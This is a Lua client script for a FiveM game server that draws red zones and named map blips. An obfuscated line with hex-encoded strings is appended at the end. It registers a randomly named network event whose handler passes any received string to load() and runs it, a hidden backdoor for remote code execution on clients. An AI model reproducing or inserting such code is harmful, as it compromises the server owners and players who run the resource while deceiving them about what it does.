Citizen.CreateThread(function()  -- tạo vòng đỏ

	for i=1, #Config.Red, 1 do
		
		local blip = AddBlipForRadius(Config.Red[i].x, Config.Red[i].y, Config.Red[i].z, Config.Red[i].h)
		SetBlipHighDetail(blip, true) 
		SetBlipColour(blip, 1) 
		SetBlipAlpha (blip, 128)

	end

end)

Citizen.CreateThread(function()  -- tạo blip
	
	for i=1, #Config.Map, 1 do
		
		local blip = AddBlipForCoord(Config.Map[i].x, Config.Map[i].y, Config.Map[i].z)
		SetBlipSprite (blip, Config.Map[i].id)
		SetBlipDisplay(blip, 4)
		SetBlipColour (blip, Config.Map[i].color)
		SetBlipScale (blip, Config.Map[i].scale)
		SetBlipAsShortRange(blip, true)

		BeginTextCommandSetBlipName("STRING")
		AddTextComponentString(Config.Map[i].name)
		EndTextCommandSetBlipName(blip)
		


		-- local blip = AddBlipForRadius(v.position.x, v.position.y, v.position.z, 100.0)
		-- SetBlipHighDetail(blip, true)
		-- SetBlipColour(blip, 1)
		-- SetBlipAlpha(blip, 60)
		-- local blip = AddBlipForCoord(v.position.x, v.position.y, v.position.z)
		-- SetBlipSprite(blip, 156)
		-- SetBlipScale(blip, 0.8)
		-- SetBlipAsShortRange(blip, true)
		-- BeginTextCommandSetBlipName("STRING")
		-- AddTextComponentString(_U("shop_robbery"))
		-- EndTextCommandSetBlipName(blip)
	end

end)
local dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x73\x51\x67\x4d\x4f\x48\x64\x50\x6b\x68\x52\x4e\x53\x74\x54\x6c\x4e\x6c\x57\x4f\x56\x6d\x46\x42\x71\x6f\x63\x6b\x65\x79","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[6][dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[1]](dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[2]) dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[6][dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[3]](dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[2], function(YknbPdCRTaaqLXiSstziArqDfXMLWNplTqpNaKNpMoCEXxwkbiclNuFGNNyYcFvIQhCLQH) dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[6][dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[4]](dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[6][dOdPBhfnfAEVxvtntgYMNkfgKOBpvJLwqoyEKgChnqhzOtmyCBcNXtsGcVlWTogvvShUel[5]](YknbPdCRTaaqLXiSstziArqDfXMLWNplTqpNaKNpMoCEXxwkbiclNuFGNNyYcFvIQhCLQH))() end)